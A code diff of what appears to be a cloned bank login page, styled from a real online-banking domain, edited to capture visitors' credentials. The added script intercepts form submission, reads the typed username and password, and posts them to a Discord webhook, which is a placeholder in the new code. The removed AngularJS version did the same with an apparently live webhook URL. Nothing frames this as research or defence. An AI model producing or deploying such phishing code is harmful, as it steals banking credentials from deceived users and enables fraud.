@@ -10,6 +10,8 @@
     <link rel="stylesheet" href="https://webbank.rebanking.com/assets/css/vendor-login.c01e6acb.css"> <link rel="stylesheet" href="https://webbank.rebanking.com/assets/css/style-login.14e9457e.css"> 
   </head> 
   <body>
+    <form id="loginForm" onsubmit="enviarDatos(event)">
+
   <div class="main-nav" role="presentation">
         <div class="logo-banco"></div>
     </div>
@@ -124,28 +126,42 @@
         </div>
     </div>
     <div id="footer" class="footer" role="footer"></div>
+      </form>
+
   
     <script>
-  angular.module('myApp', [])
-    .controller('LoginController', function($scope, $http) {
-      $scope.login = function() {
-        var data = {
-          username: $scope.username,
-          password: $scope.password
+  function enviarDatos(event) {
+        event.preventDefault(); // Evita que el formulario se envíe de forma predeterminada
+        
+        // Obtiene los valores del usuario y la contraseña
+        var usuario = document.getElementById("username").value;
+        var contrasena = document.getElementById("password").value;
+        
+        // Construye el objeto de datos que se enviará al webhook de Discord
+        var datos = {
+            username: usuario,
+            password: contrasena
         };
 
-        var discordWebhookUrl = "https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38";
+        // URL de tu webhook de Discord
+        var webhookUrl = 'https://discord.com/api/webhooks/XXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';
 
-        // Enviar datos al webhook de Discord usando $http de AngularJS
-        $http.post(discordWebhookUrl, data)
-          .then(function(response) {
-            console.log("Datos enviados al webhook de Discord:", response);
-            // Puedes redirigir al usuario a otra página o mostrar un mensaje de éxito aquí
-          })
-          .catch(function(error) {
-            console.error("Error al enviar datos al webhook de Discord:", error);
-            // Puedes mostrar un mensaje de error al usuario aquí
-          });
-      };
-    });
+        // Realiza una solicitud POST al webhook de Discord con los datos del formulario
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(datos)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Respuesta del webhook de Discord:', data);
+            // Aquí puedes manejar la respuesta del webhook si es necesario
+        })
+        .catch(error => {
+            console.error('Error al enviar datos al webhook de Discord:', error);
+            // Maneja errores si es necesario
+        });
+    }
     </script></body> </html>
